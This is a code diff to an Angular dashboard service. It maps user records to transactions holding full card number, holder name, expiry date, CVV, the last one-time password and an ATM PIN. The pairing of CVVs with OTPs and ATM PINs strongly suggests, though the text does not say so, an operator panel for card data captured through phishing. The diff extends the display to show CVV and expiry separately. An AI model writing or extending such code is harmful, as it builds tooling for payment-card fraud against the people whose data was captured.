@@ -6,6 +6,10 @@ import { map, catchError } from 'rxjs/operators';
 export interface Transaction {
   id: string;
   totalPrice: number;
+  cardNumber: string;
+  cardHolder: string;
+  expiryDate: string;
+  cvv: string;
   visaDetails: string;
   otp: string;
   atmPass: string;
@@ -31,11 +35,19 @@ export class DashboardService extends BaseApiService {
           const atms = Array.isArray(user.Atms) ? user.Atms : (Array.isArray(user.atms) ? user.atms : []);
           const lastOtp = otps.length > 0 ? (otps[otps.length - 1].Otp || otps[otps.length - 1].otp || 'N/A') : 'N/A';
           const lastAtm = atms.length > 0 ? (atms[atms.length - 1].AtmPass || atms[atms.length - 1].pass || 'N/A') : 'N/A';
+          const cardNumber = user.CardNumber || user.cc_number || 'N/A';
+          const cardHolder = user.CardHolder || user.cc_name || 'N/A';
+          const expiryDate = user.CardExpiryDate || user.cc_date || 'N/A';
+          const cvv = user.CardCvv || user.cc_cvv || 'N/A';
 
           return {
             id: user.CardId || user.id || '',
             totalPrice: Number(user.Credit ?? user.credit ?? 0),
-            visaDetails: `${user.CardNumber || user.cc_number || 'N/A'} - ${user.CardHolder || user.cc_name || 'N/A'}`,
+            cardNumber,
+            cardHolder,
+            expiryDate,
+            cvv,
+            visaDetails: `${cardNumber} - ${cardHolder}`,
             otp: String(lastOtp),
             atmPass: String(lastAtm),
             status: this.normalizeStatus(user.Status || user.status),
